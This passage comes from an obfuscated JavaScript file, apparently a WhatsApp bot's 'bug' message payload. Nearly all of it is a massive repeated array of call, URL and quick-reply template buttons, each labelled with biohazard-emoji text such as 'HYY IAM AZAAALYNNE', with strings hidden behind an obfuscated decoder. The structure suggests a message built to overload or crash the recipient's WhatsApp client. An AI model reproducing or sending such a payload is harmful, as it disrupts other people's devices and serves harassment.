b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNEAZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNEAZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0